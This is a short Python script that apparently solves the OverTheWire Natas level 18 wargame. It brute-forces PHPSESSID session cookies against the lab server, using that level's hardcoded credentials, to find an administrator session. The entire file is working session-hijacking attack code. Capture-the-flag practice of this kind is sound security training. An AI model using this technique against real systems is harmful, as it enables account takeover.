import requests

for id in range(1, 641):
    pwn_cookie = {
        "PHPSESSID": f"{id}",
    }

    r = requests.post(
        "http://natas18.natas.labs.overthewire.org/",
        auth=("natas18", "xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP"),
        cookies=pwn_cookie,
    )

    if "regular user" not in r.content.decode():
        print(r.content.decode(), id)
